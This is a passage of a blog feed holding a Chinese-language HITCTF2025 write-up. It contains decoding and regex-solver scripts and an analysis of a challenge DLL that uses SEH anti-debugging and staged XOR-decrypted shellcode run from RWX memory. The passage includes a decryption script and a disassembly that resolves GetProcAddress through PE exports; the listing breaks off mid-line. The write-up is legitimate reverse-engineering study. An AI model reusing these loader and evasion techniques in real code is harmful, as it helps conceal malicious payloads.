    <summary type="html">&lt;h1 id=&quot;ByteCTF2021-BabyDroid复现&quot;&gt;&lt;a href=&quot;#ByteCTF2021-BabyDroid复现&quot; class=&quot;headerlink&quot; title=&quot;ByteCTF2021 BabyDroid复现&quot;&gt;&lt;/a&gt;ByteCTF2021 BabyD</summary>
      
    
    
    
    <category term="Android" scheme="http://matriy330.github.io/categories/Android/"/>
    
    
    <category term="Android" scheme="http://matriy330.github.io/tags/Android/"/>
    
  </entry>
  
  <entry>
    <title>HITCTF2025 wp</title>
    <link href="http://matriy330.github.io/1732c87e/"/>
    <id>http://matriy330.github.io/1732c87e/</id>
    <published>2026-01-15T07:02:00.000Z</published>
    <updated>2026-01-15T07:02:09.897Z</updated>
    
    <content type="html"><![CDATA[<h1 id="HITCTF2025-wp"><a href="#HITCTF2025-wp" class="headerlink" title="HITCTF2025 wp"></a>HITCTF2025 wp</h1><p>好久没更新了，期末考试太忙了，之前打的比赛传一下</p><h2 id="MISC"><a href="#MISC" class="headerlink" title="MISC"></a>MISC</h2><h3 id="5-Layer-Fog"><a href="#5-Layer-Fog" class="headerlink" title="5-Layer-Fog"></a>5-Layer-Fog</h3><p><img src="https://matriy.oss-cn-beijing.aliyuncs.com/202512062053695.png" alt="image-20251206205348655"></p><p>uMkIvhvNuWSdaWu5tXW0qNAotWoeaXyCvMT5egIvqjqbSqEEy3ylSW4wUhgASqo3unywvrEmUhcYSNu4tnv5rrAlvZEhwqALtjAIUg&#x3D;&#x3D;</p><p>Subject: C&#x3D;CN, O&#x3D;HITCTF, CN&#x3D;algorithms: Xor+Base64, Rot13, BasE64, CaEsAr(3), SwApCaSe</p><p>swapcase → caesar(-3) → rot13-&gt;base64 解码-&gt;单字节 XOR key 为 0x40-&gt;最后再 base64 解码</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"><span class="keyword">import</span> codecs</span><br><span class="line"><span class="keyword">import</span> string</span><br><span class="line"></span><br><span class="line">enc = <span class="string">&quot;uMkIvhvNuWSdaWu5tXW0qNAotWoeaXyCvMT5egIvqjqbSqEEy3ylSW4wUhgASqo3unywvrEmUhcYSNu4tnv5rrAlvZEhwqALtjAIUg==&quot;</span></span><br><span class="line"></span><br><span class="line">low, up = string.ascii_lowercase, string.ascii_uppercase</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">caesar</span>(<span class="params">txt: <span class="built_in">str</span>, shift: <span class="built_in">int</span></span>) -&gt; <span class="built_in">str</span>:</span><br><span class="line">  res = []</span><br><span class="line">  <span class="keyword">for</span> ch <span class="keyword">in</span> txt:</span><br><span class="line">      <span class="keyword">if</span> ch.islower():</span><br><span class="line">          res.append(low[(low.index(ch) + shift) % <span class="number">26</span>])</span><br><span class="line">      <span class="keyword">elif</span> ch.isupper():</span><br><span class="line">          res.append(up[(up.index(ch) + shift) % <span class="number">26</span>])</span><br><span class="line">      <span class="keyword">else</span>:</span><br><span class="line">          res.append(ch)</span><br><span class="line">  <span class="keyword">return</span> <span class="string">&quot;&quot;</span>.join(res)</span><br><span class="line"></span><br><span class="line"><span class="comment"># swapcase -&gt; caesar(-3) -&gt; rot13 -&gt; base64 -&gt; XOR 0x40 -&gt; base64</span></span><br><span class="line">step1 = enc.swapcase()</span><br><span class="line">step2 = caesar(step1, -<span class="number">3</span>)</span><br><span class="line">step3 = codecs.decode(step2, <span class="string">&quot;rot_13&quot;</span>)</span><br><span class="line">step4 = base64.b64decode(step3)</span><br><span class="line">step5 = <span class="built_in">bytes</span>(b ^ <span class="number">0x40</span> <span class="keyword">for</span> b <span class="keyword">in</span> step4) </span><br><span class="line">flag = base64.b64decode(step5).decode()</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(flag)</span><br></pre></td></tr></table></figure><p>HITCTF2025{BasE64_Xor(@)+Base64_SwApCaSe_Rot13_CaEsAr(3)}</p><h3 id="Regex-Beast"><a href="#Regex-Beast" class="headerlink" title="Regex Beast"></a>Regex Beast</h3><p>Exp：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python3</span></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">Solver for the regex labyrinth challenge.</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">The pattern in enc.txt is essentially:</span></span><br><span class="line"><span class="string">/ (?=A)A (?=B)B /</span></span><br><span class="line"><span class="string">where A and B are enormous nested alternations of fixed-length byte strings.</span></span><br><span class="line"><span class="string">Because each lookahead is paired with the exact consuming part, every branch</span></span><br><span class="line"><span class="string">choice is forced to be the same on both sides, leaving a single valid string</span></span><br><span class="line"><span class="string">for each half. Concatenating the two halves yields the flag (a PNG QR code).</span></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> __future__ <span class="keyword">import</span> annotations</span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> functools <span class="keyword">import</span> lru_cache</span><br><span class="line"><span class="keyword">from</span> pathlib <span class="keyword">import</span> Path</span><br><span class="line"><span class="keyword">from</span> typing <span class="keyword">import</span> <span class="type">List</span>, <span class="type">Optional</span>, <span class="type">Tuple</span></span><br><span class="line"></span><br><span class="line">text = Path(<span class="string">&quot;enc.txt&quot;</span>).read_text()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Node</span>:</span><br><span class="line">    __slots__ = (<span class="string">&quot;typ&quot;</span>, <span class="string">&quot;children&quot;</span>, <span class="string">&quot;lit&quot;</span>)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__init__</span>(<span class="params">self, typ: <span class="built_in">str</span>, children: <span class="type">Optional</span>[<span class="type">List</span>[<span class="string">&quot;Node&quot;</span>]] = <span class="literal">None</span>, lit: <span class="built_in">bytes</span> = <span class="string">b&quot;&quot;</span></span>):</span><br><span class="line">        <span class="variable language_">self</span>.typ = typ</span><br><span class="line">        <span class="variable language_">self</span>.children = children</span><br><span class="line">        <span class="variable language_">self</span>.lit = lit</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># --- Parser for the limited regex grammar: (?:...), (?=...), and \xNN literals.</span></span><br><span class="line">idx = <span class="number">1</span>  <span class="comment"># skip leading slash</span></span><br><span class="line">end = <span class="built_in">len</span>(text) - <span class="number">1</span>  <span class="comment"># skip trailing slash</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">parse_expr</span>() -&gt; Node:</span><br><span class="line">    terms = [parse_term()]</span><br><span class="line">    <span class="keyword">while</span> idx &lt; end <span class="keyword">and</span> text[idx] == <span class="string">&quot;|&quot;</span>:</span><br><span class="line">        advance(<span class="number">1</span>)</span><br><span class="line">        terms.append(parse_term())</span><br><span class="line">    <span class="keyword">return</span> terms[<span class="number">0</span>] <span class="keyword">if</span> <span class="built_in">len</span>(terms) == <span class="number">1</span> <span class="keyword">else</span> Node(<span class="string">&quot;alt&quot;</span>, terms)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">parse_term</span>() -&gt; Node:</span><br><span class="line">    factors: <span class="type">List</span>[Node] = []</span><br><span class="line">    <span class="keyword">while</span> idx &lt; end <span class="keyword">and</span> text[idx] <span class="keyword">not</span> <span class="keyword">in</span> <span class="string">&quot;)|/&quot;</span>:</span><br><span class="line">        factors.append(parse_factor())</span><br><span class="line">    <span class="keyword">if</span> <span class="keyword">not</span> factors:</span><br><span class="line">        <span class="keyword">return</span> Node(<span class="string">&quot;lit&quot;</span>, lit=<span class="string">b&quot;&quot;</span>)  <span class="comment"># empty</span></span><br><span class="line">    <span class="keyword">return</span> factors[<span class="number">0</span>] <span class="keyword">if</span> <span class="built_in">len</span>(factors) == <span class="number">1</span> <span class="keyword">else</span> Node(<span class="string">&quot;seq&quot;</span>, factors)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">parse_factor</span>() -&gt; Node:</span><br><span class="line">    <span class="keyword">if</span> text.startswith(<span class="string">&quot;(?=&quot;</span>, idx):</span><br><span class="line">        advance(<span class="number">3</span>)</span><br><span class="line">        expr = parse_expr()</span><br><span class="line">        expect(<span class="string">&quot;)&quot;</span>)</span><br><span class="line">        advance(<span class="number">1</span>)</span><br><span class="line">        <span class="keyword">return</span> Node(<span class="string">&quot;look&quot;</span>, [expr])</span><br><span class="line">    <span class="keyword">if</span> text.startswith(<span class="string">&quot;(?:&quot;</span>, idx):</span><br><span class="line">        advance(<span class="number">3</span>)</span><br><span class="line">        expr = parse_expr()</span><br><span class="line">        expect(<span class="string">&quot;)&quot;</span>)</span><br><span class="line">        advance(<span class="number">1</span>)</span><br><span class="line">        <span class="keyword">return</span> expr  <span class="comment"># non-capturing group</span></span><br><span class="line">    <span class="keyword">if</span> text.startswith(<span class="string">&quot;\\x&quot;</span>, idx):</span><br><span class="line">        start = idx</span><br><span class="line">        <span class="keyword">while</span> text.startswith(<span class="string">&quot;\\x&quot;</span>, idx):</span><br><span class="line">            advance(<span class="number">4</span>)</span><br><span class="line">        seq = text[start:idx]</span><br><span class="line">        data = <span class="built_in">bytes</span>(<span class="built_in">int</span>(seq[i + <span class="number">2</span> : i + <span class="number">4</span>], <span class="number">16</span>) <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>, <span class="built_in">len</span>(seq), <span class="number">4</span>))</span><br><span class="line">        <span class="keyword">return</span> Node(<span class="string">&quot;lit&quot;</span>, lit=data)</span><br><span class="line">    <span class="keyword">raise</span> ValueError(<span class="string">f&quot;Unexpected token at <span class="subst">&#123;idx&#125;</span>: <span class="subst">&#123;text[idx:idx+<span class="number">10</span>]!r&#125;</span>&quot;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">advance</span>(<span class="params">n: <span class="built_in">int</span></span>) -&gt; <span class="literal">None</span>:</span><br><span class="line">    <span class="keyword">global</span> idx</span><br><span class="line">    idx += n</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">expect</span>(<span class="params">ch: <span class="built_in">str</span></span>) -&gt; <span class="literal">None</span>:</span><br><span class="line">    <span class="keyword">if</span> text[idx] != ch:</span><br><span class="line">        <span class="keyword">raise</span> ValueError(<span class="string">f&quot;Expected <span class="subst">&#123;ch!r&#125;</span> at <span class="subst">&#123;idx&#125;</span>, found <span class="subst">&#123;text[idx]!r&#125;</span>&quot;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">root = parse_expr()</span><br><span class="line"><span class="keyword">assert</span> text[idx] == <span class="string">&quot;/&quot;</span> <span class="keyword">and</span> idx == end, <span class="string">&quot;Did not consume full pattern&quot;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># --- Simplify: convert seq(look(X), Y) into logical AND of X and Y.</span></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">SNode</span>:</span><br><span class="line">    __slots__ = (<span class="string">&quot;typ&quot;</span>, <span class="string">&quot;children&quot;</span>, <span class="string">&quot;lit&quot;</span>, <span class="string">&quot;length&quot;</span>)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__init__</span>(<span class="params"></span></span><br><span class="line"><span class="params">        self,</span></span><br><span class="line"><span class="params">        typ: <span class="built_in">str</span>,</span></span><br><span class="line"><span class="params">        children: <span class="type">Optional</span>[<span class="type">List</span>[<span class="string">&quot;SNode&quot;</span>]] = <span class="literal">None</span>,</span></span><br><span class="line"><span class="params">        lit: <span class="built_in">bytes</span> = <span class="string">b&quot;&quot;</span>,</span></span><br><span class="line"><span class="params">        length: <span class="built_in">int</span> = <span class="number">0</span>,</span></span><br><span class="line"><span class="params">    </span>):</span><br><span class="line">        <span class="variable language_">self</span>.typ = typ</span><br><span class="line">        <span class="variable language_">self</span>.children = children</span><br><span class="line">        <span class="variable language_">self</span>.lit = lit</span><br><span class="line">        <span class="variable language_">self</span>.length = length</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">simplify</span>(<span class="params">node: Node</span>) -&gt; SNode:</span><br><span class="line">    <span class="keyword">if</span> node.typ == <span class="string">&quot;lit&quot;</span>:</span><br><span class="line">        <span class="keyword">return</span> SNode(<span class="string">&quot;lit&quot;</span>, lit=node.lit, length=<span class="built_in">len</span>(node.lit))</span><br><span class="line">    <span class="keyword">if</span> node.typ == <span class="string">&quot;alt&quot;</span>:</span><br><span class="line">        kids = [simplify(ch) <span class="keyword">for</span> ch <span class="keyword">in</span> node.children]</span><br><span class="line">        <span class="keyword">return</span> SNode(<span class="string">&quot;alt&quot;</span>, children=kids, length=kids[<span class="number">0</span>].length)</span><br><span class="line">    <span class="keyword">if</span> node.typ == <span class="string">&quot;seq&quot;</span>:</span><br><span class="line">        a, b = node.children</span><br><span class="line">        <span class="keyword">if</span> a.typ == <span class="string">&quot;look&quot;</span>:</span><br><span class="line">            left = simplify(a.children[<span class="number">0</span>])</span><br><span class="line">            right = simplify(b)</span><br><span class="line">            <span class="keyword">assert</span> left.length == right.length</span><br><span class="line">            <span class="keyword">return</span> SNode(<span class="string">&quot;and&quot;</span>, children=[left, right], length=left.length)</span><br><span class="line">        left = simplify(a)</span><br><span class="line">        right = simplify(b)</span><br><span class="line">        <span class="keyword">return</span> SNode(<span class="string">&quot;seq&quot;</span>, children=[left, right], length=left.length + right.length)</span><br><span class="line">    <span class="keyword">if</span> node.typ == <span class="string">&quot;look&quot;</span>:</span><br><span class="line">        <span class="keyword">return</span> simplify(node.children[<span class="number">0</span>])</span><br><span class="line">    <span class="keyword">raise</span> ValueError(<span class="string">f&quot;Unknown node type: <span class="subst">&#123;node.typ&#125;</span>&quot;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">simplify_half</span>(<span class="params">seq_node: Node</span>) -&gt; SNode:</span><br><span class="line">    <span class="comment"># each half is seq(look(expr), expr)</span></span><br><span class="line">    <span class="keyword">assert</span> seq_node.typ == <span class="string">&quot;seq&quot;</span> <span class="keyword">and</span> <span class="built_in">len</span>(seq_node.children) == <span class="number">2</span></span><br><span class="line">    <span class="keyword">return</span> simplify(seq_node)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">left_half = simplify_half(root.children[<span class="number">0</span>])</span><br><span class="line">right_half = simplify_half(root.children[<span class="number">1</span>])</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># --- Language evaluation with memoization and a small safety cap.</span></span><br><span class="line">LIMIT = <span class="number">20000</span>  <span class="comment"># sanity cap; actual sets stay size 1.</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">@lru_cache(<span class="params"><span class="literal">None</span></span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">language</span>(<span class="params">node: SNode</span>) -&gt; <span class="type">Tuple</span>[<span class="built_in">bytes</span>, ...]:</span><br><span class="line">    <span class="keyword">if</span> node.typ == <span class="string">&quot;lit&quot;</span>:</span><br><span class="line">        <span class="keyword">return</span> (node.lit,)</span><br><span class="line">    <span class="keyword">if</span> node.typ == <span class="string">&quot;alt&quot;</span>:</span><br><span class="line">        res = <span class="built_in">set</span>()</span><br><span class="line">        <span class="keyword">for</span> ch <span class="keyword">in</span> node.children:</span><br><span class="line">            res.update(language(ch))</span><br><span class="line">            <span class="keyword">if</span> <span class="built_in">len</span>(res) &gt; LIMIT:</span><br><span class="line">                <span class="keyword">raise</span> MemoryError(<span class="string">&quot;Language exploded&quot;</span>)</span><br><span class="line">        <span class="keyword">return</span> <span class="built_in">tuple</span>(res)</span><br><span class="line">    <span class="keyword">if</span> node.typ == <span class="string">&quot;seq&quot;</span>:</span><br><span class="line">        left = language(node.children[<span class="number">0</span>])</span><br><span class="line">        right = language(node.children[<span class="number">1</span>])</span><br><span class="line">        res = <span class="built_in">set</span>()</span><br><span class="line">        <span class="keyword">for</span> a <span class="keyword">in</span> left:</span><br><span class="line">            <span class="keyword">for</span> b <span class="keyword">in</span> right:</span><br><span class="line">                res.add(a + b)</span><br><span class="line">                <span class="keyword">if</span> <span class="built_in">len</span>(res) &gt; LIMIT:</span><br><span class="line">                    <span class="keyword">raise</span> MemoryError(<span class="string">&quot;Language exploded&quot;</span>)</span><br><span class="line">        <span class="keyword">return</span> <span class="built_in">tuple</span>(res)</span><br><span class="line">    <span class="keyword">if</span> node.typ == <span class="string">&quot;and&quot;</span>:</span><br><span class="line">        lset = <span class="built_in">set</span>(language(node.children[<span class="number">0</span>]))</span><br><span class="line">        rset = <span class="built_in">set</span>(language(node.children[<span class="number">1</span>]))</span><br><span class="line">        <span class="keyword">return</span> <span class="built_in">tuple</span>(lset &amp; rset)</span><br><span class="line">    <span class="keyword">raise</span> ValueError(<span class="string">f&quot;Unknown SNode type: <span class="subst">&#123;node.typ&#125;</span>&quot;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">left_word = language(left_half)</span><br><span class="line">right_word = language(right_half)</span><br><span class="line"><span class="keyword">assert</span> <span class="built_in">len</span>(left_word) == <span class="built_in">len</span>(right_word) == <span class="number">1</span>, <span class="string">&quot;Ambiguous language?&quot;</span></span><br><span class="line"></span><br><span class="line">flag_bytes = left_word[<span class="number">0</span>] + right_word[<span class="number">0</span>]</span><br><span class="line">Path(<span class="string">&quot;flag.png&quot;</span>).write_bytes(flag_bytes)</span><br><span class="line"></span><br><span class="line"><span class="keyword">try</span>:</span><br><span class="line">    <span class="comment"># If OpenCV is available we can decode directly; otherwise just print path.</span></span><br><span class="line">    <span class="keyword">import</span> cv2  <span class="comment"># type: ignore</span></span><br><span class="line"></span><br><span class="line">    img = cv2.imread(<span class="string">&quot;flag.png&quot;</span>)</span><br><span class="line">    qr = cv2.QRCodeDetector()</span><br><span class="line">    val, _, _ = qr.detectAndDecode(img)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;QR decode:&quot;</span>, val)</span><br><span class="line"><span class="keyword">except</span> Exception:</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;Flag image saved to flag.png&quot;</span>)</span><br><span class="line"></span><br></pre></td></tr></table></figure><p><img src="https://matriy.oss-cn-beijing.aliyuncs.com/202512062103089.png" alt="image-20251206210359020"></p><p>flag{3ec1998a-efc7-46f9-85e2-0d3a4427260e}</p><h2 id="RE"><a href="#RE" class="headerlink" title="RE"></a>RE</h2><h3 id="AI-assistant"><a href="#AI-assistant" class="headerlink" title="AI assistant"></a>AI assistant</h3><p>这算AI吧没看出来逆向</p><p><img src="https://matriy.oss-cn-beijing.aliyuncs.com/202512062105870.png" alt="709567631754d8671b81531a04889f29"></p><h3 id="Snake1-一血"><a href="#Snake1-一血" class="headerlink" title="Snake1 [一血]"></a>Snake1 [一血]</h3><p>exe没有实际逻辑，真实逻辑在dll</p><p>所有导出开头都调用 seh_antidbg_stub：构造 SEH，故意除零，若异常链被破坏，就 ExitProcess</p><p>Stage1 Loader：用密钥0b882732-HITCTF-2O25-decrypt-key-06b79fe436e0对 1.txt 进行 XOR 解密，然后强行把前 4 字节（首个 dword）覆盖成 C3C3C3C3（相当于一段 ret 滑梯），把内存页权限改成 RWX（可读&#x2F;可写&#x2F;可执行）后调用执行,本质上是个障眼法。</p><p><img src="https://cdn.jsdelivr.net/gh/Matriy330/blog_pitcures@main/img/image-20260115145241590.png" alt="image-20260115145241590"></p><p>Stage2Loader</p><p>用常量表 XOR 解出 key hitctf，再次读取 1.txt，用新 key XOR 解密。</p><p>将缓冲首 4 字节改成 8B E8 33 C0（mov ebp,eax; xor eax,eax），RWX 后跳进解出的 shellcode</p><p><img src="https://cdn.jsdelivr.net/gh/Matriy330/blog_pitcures@main/img/image-20260115145317323.png" alt="image-20260115145317323"></p><p>把 1.txt 解 XOR 得到 shellcode</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">from pathlib import Path</span><br><span class="line">key = b&quot;hitctf&quot;              # Stage2 的解密 key</span><br><span class="line">ct = Path(&quot;1.txt&quot;).read_bytes()</span><br><span class="line">buf = bytearray(b ^ key[i % len(key)] for i, b in enumerate(ct))</span><br><span class="line">buf[:4] = bytes.fromhex(&quot;8b e8 33 c0&quot;)  # 补上入口</span><br><span class="line">Path(&quot;1_stage2.bin&quot;).write_bytes(buf)</span><br></pre></td></tr></table></figure><p>disasm 后发现两段自解码数据：第一段 XOR 出OutputDebugStringA，第二段 XOR 出 flag</p><p>问问ai就知道大概什么逻辑了</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br></pre></td><td class="code"><pre><span class="line">000000ea &lt;.data+0xea&gt;:</span><br><span class="line">  ea:   89 9d 76 01 00 00       mov    DWORD PTR [ebp+0x176],ebx</span><br><span class="line">  f0:   e8 e1 ff ff ff          call   0xd6</span><br><span class="line">  f5:   89 85 6a 01 00 00       mov    DWORD PTR [ebp+0x16a],eax</span><br><span class="line">  fb:   8b d8                   mov    ebx,eax</span><br><span class="line">  fd:   8b 43 3c                mov    eax,DWORD PTR [ebx+0x3c]</span><br><span class="line"> 100:   8b 54 18 78             mov    edx,DWORD PTR [eax+ebx*1+0x78]</span><br><span class="line"> 104:   03 d3                   add    edx,ebx</span><br><span class="line"> 106:   8b 4a 18                mov    ecx,DWORD PTR [edx+0x18]</span><br><span class="line"> 109:   8b 72 20                mov    esi,DWORD PTR [edx+0x20]</span><br><span class="line"> 10c:   03 f3                   add    esi,ebx</span><br><span class="line"> 10e:   49                      dec    ecx</span><br><span class="line"> 10f:   8b 3c 8e                mov    edi,DWORD PTR [esi+ecx*4]</span><br><span class="line"> 112:   03 fb                   add    edi,ebx</span><br><span class="line"> 114:   8b 07                   mov    eax,DWORD PTR [edi]</span><br><span class="line"> 116:   3d 47 65 74 50          cmp    eax,0x50746547</span><br><span class="line"> 11b:   75 f1                   jne    0x10e</span><br><span class="line"> 11d:   8b 47 04                mov    eax,DWORD PTR [edi+0x4]</span><br><span class="line"> 120:   3d 72 6f 63 41          cmp    eax,0x41636f72</span><br><span class="line"> 125:   75 e7                   jne    0x10e</span><br><span class="line"> 127:   8b 72 24                mov    esi,DWORD PTR [edx+0x24]</span><br><span class="line"> 12a:   03 f3                   add    esi,ebx</span><br><span class="line"> 12c:   66 8b 0c 4e             mov    cx,WORD PTR [esi+ecx*2]</span><br><span class="line"> 130:   8b 72 1c                mov    esi,DWORD PTR [edx+0x1c]</span><br><span class="line"> 133:   03 f3                   add    esi,ebx</span><br><span class="line"> 135:   8b 14 8e                mov    edx,DWORD PTR [esi+ecx*4]</span><br><span class="line"> 138:   03 d3                   add    edx,ebx</span><br><span class="line"> 13a:   89 95 6e 01 00 00       mov    DWORD PTR [ebp+0x16e],edx</span><br><span class="line"> 140:   e8 da fe ff ff          call   0x1f</span><br><span class="line"> 145:   50                      push   eax</span><br><span class="line"> 146:   8b 85 6a 01 00 00       mov    eax,DWORD PTR [ebp+0x16a]</span><br><span class="line"> 14c:   50                      push   eax</span><br><span class="line"> 14d:   8b 85 6e 01 00 00       mov    eax,DWORD PTR [ebp+0x16e]</span><br><span class="line"> 153:   ff d0                   call   eax</span><br><span class="line"> 155:   89 85 72 01 00 00       mov    DWORD PTR [ebp+0x172],eax</span><br><span class="line"> 15b:   e8 10 ff ff ff          call   0x70</span><br><span class="line"> 160:   50                      push   eax</span><br><span class="line"> 161:   8b 85 72 01 00 00       mov    eax,DWORD PTR 